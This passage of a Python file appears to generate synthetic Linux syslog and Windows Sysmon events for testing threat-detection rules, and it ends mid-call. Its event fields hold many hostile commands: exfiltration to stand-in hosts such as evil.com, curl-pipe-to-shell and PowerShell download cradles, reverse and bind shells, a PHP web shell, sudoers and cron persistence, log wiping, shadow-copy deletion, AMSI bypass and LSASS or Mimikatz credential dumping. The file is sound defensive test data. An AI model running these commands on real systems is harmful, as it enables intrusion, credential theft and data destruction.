    ssh_tunnel_cmds = [
        "ssh -L 8080:internal-db:3306 admin@bastion-01",
        "ssh -R 9090:localhost:22 attacker@evil.com",
        "ssh -D 1080 -N -f admin@jump-host",
        "autossh -M 0 -N -f -L 3389:dc01:3389 compromised@pivot",
    ]
    for i, cmd in enumerate(ssh_tunnel_cmds):
        events.append(linux_event("ssh", cmd, offset=310+i, facility="auth"))

    # ── Suspicious Download to /tmp ──
    download_cmds = [
        ("wget", "wget http://evil.com/backdoor.elf -O /tmp/updater"),
        ("curl", "curl -o /tmp/payload http://185.220.101.1/shell.sh"),
        ("wget", "wget -q http://c2.attacker.org/stage2 -O /tmp/s2"),
        ("curl", "curl http://evil.com/miner -o /tmp/xmrig"),
    ]
    for i, (proc, cmd) in enumerate(download_cmds):
        events.append(linux_event(proc, cmd, offset=320+i, facility="syslog"))

    # ── Process Execution from /dev/shm ──
    devshm_cmds = [
        "/dev/shm/reverse_shell",
        "chmod +x /dev/shm/miner && /dev/shm/miner",
        "bash /dev/shm/payload.sh",
    ]
    for i, cmd in enumerate(devshm_cmds):
        events.append(linux_event("bash", cmd, offset=330+i, facility="syslog"))

    # ── Sudoers Modification ──
    sudoers_cmds = [
        "visudo -f /etc/sudoers.d/backdoor",
        "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "cp /tmp/evil-sudoers /etc/sudoers.d/admin-override",
    ]
    for i, cmd in enumerate(sudoers_cmds):
        events.append(linux_event("bash", cmd, offset=340+i, facility="syslog"))

    # ── Shell Profile Persistence ──
    profile_cmds = [
        "echo 'curl http://c2.evil.com/beacon|sh' >> ~/.bashrc",
        "echo '/tmp/backdoor &' >> /etc/profile.d/startup.sh",
        "echo 'nohup /tmp/miner &' >> ~/.bash_profile",
        "echo 'export PATH=/tmp/evil:$PATH' >> /etc/bash.bashrc",
    ]
    for i, cmd in enumerate(profile_cmds):
        events.append(linux_event("bash", cmd, offset=350+i, facility="syslog"))

    # ── At Job Scheduled ──
    at_cmds = [
        "at -f /tmp/payload.sh now + 5 minutes",
        "echo '/tmp/backdoor' | at midnight",
    ]
    for i, cmd in enumerate(at_cmds):
        events.append(linux_event("at", cmd, offset=360+i, facility="cron"))
    events.append(linux_event("batch", "batch < /tmp/commands.sh",
        offset=362, facility="cron"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 3): Advanced Linux Detection Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── DNS Tunneling ──
    dns_tunnel_cmds = [
        "iodine -f 10.0.0.1 tunnel.evil.com",
        "dns2tcp -z evil.com -r ssh -l 127.0.0.1 -p 2222",
        "dnscat --dns server=attacker.com --secret=s3cr3t",
    ]
    for i, cmd in enumerate(dns_tunnel_cmds):
        events.append(linux_event("bash", cmd, offset=400+i, facility="syslog"))

    # ── Hosts File Modification ──
    hosts_cmds = [
        "echo '10.0.0.1 updates.microsoft.com' >> /etc/hosts",
        "sed -i 's/nameserver .*/nameserver 185.220.101.1/' /etc/resolv.conf",
    ]
    for i, cmd in enumerate(hosts_cmds):
        events.append(linux_event("bash", cmd, offset=410+i, facility="syslog"))

    # ── Process Memory Access via /proc ──
    proc_cmds = [
        "cat /proc/self/environ | tr '\\0' '\\n' | grep PASSWORD",
        "cat /proc/1234/maps",
        "dd if=/proc/5678/mem of=/tmp/memdump bs=1 skip=4096 count=65536",
        "cat /proc/self/maps | grep heap",
    ]
    for i, cmd in enumerate(proc_cmds):
        events.append(linux_event("bash", cmd, offset=420+i, facility="syslog"))

    # ── Web Shell Creation ──
    webshell_cmds = [
        "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/cmd.php",
        "cp /tmp/shell.jsp /var/www/cgi-bin/upload.jsp",
        "curl -o /usr/share/nginx/html/backdoor.php http://evil.com/shell.php",
    ]
    for i, cmd in enumerate(webshell_cmds):
        events.append(linux_event("bash", cmd, offset=430+i, facility="syslog"))

    # ── Cryptominer Activity ──
    miner_cmds = [
        "./xmrig --url stratum+tcp://pool.minexmr.com:4444 --user wallet123 --donate-level 1",
        "cpuminer -a cryptonight -o stratum+ssl://xmr.pool.com:443",
        "/tmp/.hidden/minerd -a scrypt -o stratum+tcp://ltc.pool.com:3333",
    ]
    for i, cmd in enumerate(miner_cmds):
        events.append(linux_event("bash", cmd, offset=440+i, facility="syslog"))

    # ── Log File Tampering ──
    log_tamper_cmds = [
        "rm -f /var/log/auth.log",
        "truncate -s 0 /var/log/syslog",
        "cat /dev/null > /var/log/wtmp",
        "shred /var/log/secure",
        "journalctl --vacuum-time=1s",
    ]
    for i, cmd in enumerate(log_tamper_cmds):
        events.append(linux_event("bash", cmd, offset=450+i, facility="syslog"))

    # ── Post-Exploitation Enumeration Scripts ──
    enum_cmds = [
        "curl -L http://evil.com/linpeas.sh | bash",
        "wget http://evil.com/LinEnum.sh -O /tmp/le.sh && bash /tmp/le.sh",
        "./linux-exploit-suggester.sh",
        "./pspy64 -f",
    ]
    for i, cmd in enumerate(enum_cmds):
        events.append(linux_event("bash", cmd, offset=460+i, facility="syslog"))

    # ── Bind Shell Listener ──
    bind_cmds = [
        "nc -lvp 4444",
        "ncat -lvp 8080 -e /bin/bash",
        "ncat -lp 443 --ssl -e /bin/sh",
        "socat TCP-LISTEN:9090,reuseaddr,fork EXEC:/bin/sh,pty,stderr",
    ]
    for i, cmd in enumerate(bind_cmds):
        events.append(linux_event("bash", cmd, offset=470+i, facility="syslog"))

    # ── Suspicious Cron Job Content ──
    cron_cmds = [
        "echo '*/5 * * * * curl http://evil.com/update|sh' >> /etc/cron.d/update",
        "echo '0 * * * * wget http://c2.attacker.org/payload|bash' > /var/spool/cron/root",
        "echo '*/10 * * * * echo YmFzaCAtaQ== | base64 -d | bash' >> /etc/cron.d/hidden",
    ]
    for i, cmd in enumerate(cron_cmds):
        events.append(linux_event("bash", cmd, offset=480+i, facility="syslog"))

    # ── Hidden File Creation in Suspicious Locations ──
    hidden_cmds = [
        "mkdir /tmp/.X11-unix-bak && cp /tmp/payload /tmp/.X11-unix-bak/",
        "cp /tmp/miner /dev/shm/.hidden_miner",
        "echo '#!/bin/bash' > /var/tmp/.update.sh",
        "mkdir -p /run/lock/.cache && mv /tmp/rootkit /run/lock/.cache/",
    ]
    for i, cmd in enumerate(hidden_cmds):
        events.append(linux_event("bash", cmd, offset=490+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 4): MITRE Tactic Expansion - Linux Events
    # ═══════════════════════════════════════════════════════════════

    # ── Network Service Scanning (T1046) ──
    scan_cmds = [
        ("nmap", "nmap -sV -p 1-1024 192.168.1.0/24"),
        ("nmap", "nmap -sS -p 22,80,443,3306,5432 10.0.0.0/24"),
        ("masscan", "masscan -p 1-65535 --rate 1000 192.168.0.0/16"),
        ("zmap", "zmap -p 443 -B 10M -o results.csv"),
    ]
    for i, (proc, cmd) in enumerate(scan_cmds):
        events.append(linux_event(proc, cmd, offset=550+i, facility="syslog"))

    # ── System Owner/User Discovery (T1033) ──
    discovery_cmds = [
        "w ",
        "who -a",
        "last -a",
        "lastlog",
        "getent passwd",
        "cat /etc/group",
    ]
    for i, cmd in enumerate(discovery_cmds):
        events.append(linux_event("bash", cmd, offset=560+i, facility="syslog"))

    # ── External Remote Service Abuse (T1133) ──
    events.append(linux_event("sshd",
        "Accepted password for admin from 45.33.32.156 port 52345 ssh2",
        offset=570, facility="auth"))
    events.append(linux_event("bash",
        "openvpn --config /tmp/attacker.ovpn",
        offset=571, facility="syslog"))
    events.append(linux_event("bash",
        "xfreerdp /v:internal-dc.corp.local /u:admin /p:P@ssw0rd",
        offset=572, facility="syslog"))

    # ── Exfiltration Over Alternative Protocol (T1048) ──
    exfil_cmds = [
        "cat /etc/shadow | nc 185.220.101.1 9999",
        "tar czf - /home/ | ncat 45.33.32.156 8080",
        "scp -r /etc/ attacker@185.220.101.1:/loot/",
        "cat /root/.ssh/id_rsa | curl -X POST http://evil.com/collect -d @-",
    ]
    for i, cmd in enumerate(exfil_cmds):
        events.append(linux_event("bash", cmd, offset=580+i, facility="syslog"))

    # ── Archive Collected Data (T1560.001) ──
    archive_cmds = [
        "tar -czf /tmp/loot.tar.gz /etc/passwd /etc/shadow /root/.ssh/",
        "zip -r /dev/shm/data.zip /home/ /var/www/html/",
        "tar czf /var/tmp/backup.tar.gz /opt/application/config/",
    ]
    for i, cmd in enumerate(archive_cmds):
        events.append(linux_event("bash", cmd, offset=590+i, facility="syslog"))

    # ── Sensitive Data Access (T1005) ──
    data_access_cmds = [
        "cat /root/.ssh/id_rsa",
        "cat /home/admin/.oci/config",
        "cat /home/deploy/.aws/credentials",
        "cat /var/www/html/.env",
        "cat /opt/app/database.yml",
    ]
    for i, cmd in enumerate(data_access_cmds):
        events.append(linux_event("bash", cmd, offset=600+i, facility="syslog"))

    # ── Proxy/Tunneling Tools (T1090) ──
    proxy_cmds = [
        "chisel client 185.220.101.1:8080 R:socks",
        "chisel server --port 8080 --reverse",
        "frpc -c /tmp/frpc.ini",
        "proxychains4 ssh admin@internal-host",
    ]
    for i, cmd in enumerate(proxy_cmds):
        events.append(linux_event("bash", cmd, offset=610+i, facility="syslog"))

    # ── Encrypted Channel C2 (T1573) ──
    encrypted_cmds = [
        "openssl s_client -connect c2.evil.com:443",
        "ncat --ssl -e /bin/sh 185.220.101.1 443",
        "socat openssl-connect:evil.com:443,cert=/tmp/cert.pem EXEC:/bin/bash",
        "ssh -fNR 9090:localhost:22 attacker@evil.com",
    ]
    for i, cmd in enumerate(encrypted_cmds):
        events.append(linux_event("bash", cmd, offset=620+i, facility="syslog"))

    # ── Setuid Binary Creation (T1548.001) ──
    suid_cmds = [
        "chmod +s /tmp/exploit",
        "chmod u+s /tmp/backdoor",
        "chmod 4755 /tmp/root_shell",
        "chmod 6755 /var/tmp/persistence",
    ]
    for i, cmd in enumerate(suid_cmds):
        events.append(linux_event("bash", cmd, offset=630+i, facility="syslog"))

    # ═══════════════════════════════════════════════════════════════
    #  HUNTING: High-volume events for aggregation-based queries
    # ═══════════════════════════════════════════════════════════════

    # ── SSH Brute Force: 15 failures from one IP to trigger frequency threshold ──
    attacker_brute_ip = "91.92.109.18"
    for i in range(15):
        events.append(linux_event("sshd",
            f"Failed password for root from {attacker_brute_ip} port {40000+i} ssh2",
            host="web-prod-01", offset=500+i))

    # ── Multi-Stage Attack on Single Host (same host: recon → access → persist) ──
    target_host = "app-prod-02"
    # Stage 1: Initial access (SSH brute force)
    for i in range(5):
        events.append(linux_event("sshd",
            f"Failed password for admin from 185.220.101.1 port {50000+i} ssh2",
            host=target_host, offset=520+i))
    # Stage 2: Successful login followed by downloads
    events.append(linux_event("sshd",
        "Accepted password for admin from 185.220.101.1 port 50005 ssh2",
        host=target_host, offset=526))
    events.append(linux_event("bash",
        "curl -o /tmp/payload http://evil.com/stage2.sh",
        host=target_host, offset=527, facility="syslog"))
    events.append(linux_event("bash",
        "wget http://c2.attacker.org/persist -O /tmp/persist.sh",
        host=target_host, offset=528, facility="syslog"))
    # Stage 3: Persistence
    events.append(linux_event("bash",
        "echo 'ssh-rsa AAAA... attacker@evil' >> /home/admin/.ssh/authorized_keys",
        host=target_host, offset=529, facility="syslog"))
    events.append(linux_event("bash",
        "echo '*/5 * * * * curl http://evil.com/beacon|sh' >> /etc/cron.d/update",
        host=target_host, offset=530, facility="syslog"))
    events.append(linux_event("bash",
        "systemctl enable /etc/systemd/system/backdoor.service",
        host=target_host, offset=531, facility="syslog"))
    # Stage 4: Credential access
    events.append(linux_event("bash",
        "cat /etc/shadow",
        host=target_host, offset=532, facility="syslog"))
    events.append(linux_event("bash",
        "cat /etc/passwd",
        host=target_host, offset=533, facility="syslog"))

    # ── Persistence Score: Multiple persistence mechanisms on one host ──
    persist_host = "bastion-01"
    persist_cmds = [
        ("bash", "echo 'curl http://c2.evil.com/beacon|sh' >> ~/.bashrc"),
        ("crontab", "(admin) REPLACE (root) crontab"),
        ("bash", "systemctl enable /etc/systemd/system/evil-backdoor.service"),
        ("bash", "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"),
        ("bash", "echo 'admin ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"),
        ("at", "at -f /tmp/payload.sh now + 5 minutes"),
    ]
    for i, (proc, cmd) in enumerate(persist_cmds):
        events.append(linux_event(proc, cmd, host=persist_host,
            offset=540+i, facility="syslog"))

    return events


# ═══════════════════════════════════════════════════════════════════
#  Windows Sysmon Event Generators
# ═══════════════════════════════════════════════════════════════════

def sysmon_event(event_id, image, command_line, host=None, user=None,
                 parent_image="C:\\Windows\\explorer.exe", offset=0, **extra):
    """Generate a Windows Sysmon Event 1 style JSON event."""
    if host is None:
        host = random.choice(WINDOWS_HOSTS)
    if user is None:
        user = random.choice(WINDOWS_USERS)
    event_time = ts(offset)
    current_directory = ntpath.dirname(image) + "\\"
    original_name = ntpath.basename(image)
    parent_cmd = extra.pop("ParentCommandLine", ntpath.basename(parent_image))
    event = {
        "EventID": event_id,
        "TimeCreated": event_time,
        "UtcTime": event_time,
        "Computer": host,
        "Channel": "Microsoft-Windows-Sysmon/Operational",
        "Provider": "Microsoft-Windows-Sysmon",
        "User": user,
        "ProcessId": random.randint(100, 9999),
        "ProcessGuid": windows_guid(),
        "Image": image,
        "CommandLine": command_line,
        "CurrentDirectory": current_directory,
        "FileVersion": "10.0.0.0",
        "Description": f"{original_name} process",
        "Product": "Microsoft Windows Operating System",
        "Company": "Microsoft Corporation",
        "OriginalFileName": original_name,
        "Hashes": (
            f"SHA1={(uuid.uuid4().hex + uuid.uuid4().hex)[:40].upper()},"
            f"MD5={uuid.uuid4().hex.upper()},"
            f"SHA256={(uuid.uuid4().hex + uuid.uuid4().hex)[:64].upper()}"
        ),
        "LogonGuid": windows_guid(),
        "LogonId": hex(random.randint(0x3E4, 0xFFF)),
        "TerminalSessionId": random.choice([0, 1, 2, 3, 10]),
        "IntegrityLevel": random.choice(["System", "High", "Medium"]),
        "ParentProcessGuid": windows_guid(),
        "ParentProcessId": random.randint(100, 9999),
        "ParentImage": parent_image,
        "ParentCommandLine": parent_cmd,
    }
    event.update(extra)
    return event


def generate_windows_events():
    """Generate Windows Sysmon events covering all 24 Windows rules."""
    events = []

    # ── LOLBins (20 rules) ──
    lolbins = {
        "at.exe": "at 12:00 /every:M,T,W,Th,F C:\\Temp\\payload.exe",
        "bitsadmin.exe": "bitsadmin /transfer myJob /download http://evil.com/payload.exe C:\\Temp\\payload.exe",
        "certutil.exe": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe",
        "cmd.exe": "cmd.exe /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')",
        "cscript.exe": "cscript.exe C:\\Temp\\evil.vbs",
        "ipconfig.exe": "ipconfig /all",
        "mshta.exe": "mshta.exe http://evil.com/payload.hta",
        "net.exe": "net user backdoor P@ssw0rd /add",
        "net1.exe": "net1 user backdoor P@ssw0rd /add",
        "powershell.exe": "powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')",
        "regsvr32.exe": "regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll",
        "rundll32.exe": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
        "sc.exe": "sc create evilsvc binPath= C:\\Temp\\backdoor.exe start= auto",
        "schtasks.exe": "schtasks /create /sc minute /mo 5 /tn EvilTask /tr C:\\Temp\\payload.exe",
        "systeminfo.exe": "systeminfo",
        "taskkill.exe": "taskkill /F /IM defender.exe",
        "tasklist.exe": "tasklist /svc",
        "whoami.exe": "whoami /all",
        "wmic.exe": "wmic process call create 'C:\\Temp\\payload.exe'",
        "wscript.exe": "wscript.exe C:\\Temp\\evil.vbs",
    }
    for i, (binary, cmd) in enumerate(lolbins.items()):
        for j in range(2):
            events.append(sysmon_event(
                event_id=1,
                image=f"C:\\Windows\\System32\\{binary}",
                command_line=cmd,
                parent_image="C:\\Windows\\System32\\cmd.exe",
                offset=i*3+j,
            ))

    # ── Certutil Download/Decode (new rule) ──
    certutil_cmds = [
        "certutil -urlcache -split -f http://malware.example.com/payload.exe C:\\Temp\\payload.exe",
        "certutil -decode C:\\Temp\\encoded.b64 C:\\Temp\\malware.exe",
        "certutil -decodehex C:\\Temp\\hex.txt C:\\Temp\\binary.exe",
    ]
    for i, cmd in enumerate(certutil_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\certutil.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=200+i,
        ))

    # ── Encoded PowerShell Execution (new rule) ──
    ps_cmds = [
        "powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=",
        "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
        "powershell.exe -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQ==",
        "powershell.exe -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA",
    ]
    for i, cmd in enumerate(ps_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=210+i,
        ))

    # ── Service Creation via SC (new rule) ──
    sc_cmds = [
        'sc create evilsvc binPath= "C:\\Temp\\backdoor.exe" start= auto',
        'sc.exe create persistence binPath= C:\\Windows\\Temp\\svc.exe',
    ]
    for i, cmd in enumerate(sc_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\sc.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            user="NT AUTHORITY\\SYSTEM",
            offset=220+i,
        ))

    # ── Credential Dumping via Procdump (new rule) ──
    # sel1: procdump + lsass
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\procdump.exe",
        command_line="procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=230,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\procdump64.exe",
        command_line="procdump64.exe -accepteula -ma lsass.exe out.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=231,
    ))
    # sel2: any process writing lsass.dmp
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\dumper.exe",
        command_line="C:\\Tools\\dumper.exe --output lsass.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=232,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW: Advanced Windows Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Shadow Copy Deletion (Ransomware) ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=300,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin Delete Shadows /for=C: /all",
        parent_image="C:\\malware\\ransomware.exe",
        offset=301,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wbem\\wmic.exe",
        command_line="wmic shadowcopy delete",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=302,
    ))

    # ── AMSI Bypass ──
    amsi_cmds = [
        "powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "powershell.exe -c $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiContext','NonPublic,Static')",
        "powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/amsi.dll')",
    ]
    for i, cmd in enumerate(amsi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=310+i,
        ))

    # ── WMI Persistence ──
    wmi_cmds = [
        "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name='EvilFilter', EventNamespace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent'",
        "powershell.exe Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='EvilConsumer';CommandLineTemplate='C:\\Temp\\payload.exe'}",
        "powershell.exe Register-WmiEvent -Namespace root\\cimv2 -Query 'SELECT * FROM Win32_ProcessStartTrace' -Action {C:\\Temp\\payload.exe}",
        "powershell.exe New-CimInstance -ClassName __FilterToConsumerBinding -Namespace root\\subscription",
    ]
    for i, cmd in enumerate(wmi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Windows\\System32\\wbem\\wmic.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=320+i,
        ))

    # ── Registry Run Key Modification ──
    reg_cmds = [
        'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v EvilPersistence /t REG_SZ /d "C:\\Temp\\backdoor.exe" /f',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Updater /t REG_SZ /d "C:\\Temp\\payload.exe" /f',
        'powershell.exe New-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name Evil -Value "C:\\Temp\\evil.exe"',
    ]
    for i, cmd in enumerate(reg_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\reg.exe" if cmd.startswith("reg") else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=330+i,
        ))

    # ── DLL Side-Loading from Suspicious Path ──
    sideload_cmds = [
        ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Users\\Public\\evil.dll,DllMain"),
        ("C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe /s C:\\Users\\analyst\\AppData\\Local\\Temp\\malware.dll"),
        ("C:\\Windows\\System32\\msiexec.exe", "msiexec.exe /i C:\\Users\\analyst\\Downloads\\trojan.msi /quiet"),
    ]
    for i, (image, cmd) in enumerate(sideload_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=340+i,
        ))

    # ── BCDEdit Recovery Disable (Ransomware) ──
    bcd_cmds = [
        "bcdedit.exe /set {default} recoveryenabled no",
        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
    ]
    for i, cmd in enumerate(bcd_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\bcdedit.exe",
            command_line=cmd,
            parent_image="C:\\malware\\ransomware.exe",
            offset=350+i,
        ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 2): Additional Windows Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Mimikatz Execution Patterns ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\mimikatz.exe",
        command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=400,
    ))
    mimikatz_cmdlines = [
        "C:\\Tools\\mimi.exe sekurlsa::wdigest",
        "C:\\Tools\\procdump.exe lsadump::sam",
        "powershell.exe lsadump::dcsync /domain:corp.local /user:krbtgt",
        "C:\\Temp\\katz.exe privilege::debug token::elevate",
    ]
    for i, cmd in enumerate(mimikatz_cmdlines):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Temp\\mimikatz.exe" if "mimi" in cmd or "katz" in cmd else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            host="DC01.corp.local",
            offset=401+i,
        ))

    # ── Firewall Rule Modification ──
    fw_cmds = [
        "netsh advfirewall firewall add rule name=EvilRule dir=in action=allow protocol=tcp localport=4444",
        "netsh advfirewall set allprofiles state off",
        "netsh advfirewall firewall delete rule name=WindowsDefenderFirewall",
    ]
    for i, cmd in enumerate(fw_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\netsh.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=410+i,
        ))

    # ── RDP Lateral Movement ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:192.168.1.50",
        parent_image="C:\\Windows\\explorer.exe",
        offset=420,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:DC01.corp.local /admin",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=421,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\reg.exe",
        command_line='reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=422,
    ))

    # ── Scheduled Task Creation via Schtasks ──
    schtask_cmds = [
        "schtasks.exe /create /sc minute /mo 5 /tn PersistTask /tr C:\\Temp\\backdoor.exe /ru SYSTEM",
        "schtasks /create /tn Updater /tr C:\\Windows\\Temp\\svc.exe /sc onlogon",
    ]
    for i, cmd in enumerate(schtask_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\schtasks.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=430+i,
        ))

    # ── PowerShell Download Cradle ──
    ps_download_cmds = [
        ("powershell.exe", "powershell.exe -c Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\payload.exe"),
        ("powershell.exe", "powershell.exe -c (New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1') | IEX"),
        ("pwsh.exe", "pwsh.exe -c (New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\\Temp\\p.exe')"),
        ("powershell.exe", "powershell.exe Start-BitsTransfer -Source http://evil.com/payload.exe -Destination C:\\Temp\\payload.exe"),
        ("powershell.exe", "powershell.exe Invoke-RestMethod -Uri http://evil.com/api/config | IEX"),
    ]
    for i, (binary, cmd) in enumerate(ps_download_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\{binary}" if binary == "powershell.exe" else f"C:\\Program Files\\PowerShell\\7\\{binary}",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=440+i,
        ))

    # ── LSASS Memory Access via comsvcs.dll ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=450,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).Id C:\\Temp\\out.dmp full",
        parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        host="DC01.corp.local",
        offset=451,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 3): Advanced Windows Detection Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Event Log Clearing ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil.exe cl Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=500,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wevtutil.exe",
        command_line="wevtutil cl System",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=501,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe Clear-EventLog -LogName Security",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=502,
    ))

    # ── PsExec Remote Execution ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec.exe",
        command_line="psexec.exe \\\\DC01 -accepteula -s cmd.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=510,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\PsExec64.exe",
        command_line="psexec64.exe \\\\192.168.1.50 -accepteula -u admin -p P@ss cmd /c whoami",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=511,
    ))

    # ── UAC Bypass ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\fodhelper.exe",
        command_line="fodhelper.exe",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=520,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\eventvwr.exe",
        command_line="eventvwr.exe",
        parent_image="C:\\Temp\\malware.exe",
        offset=521,
    ))
    events.append(sysmon_event(
        event_id=1,
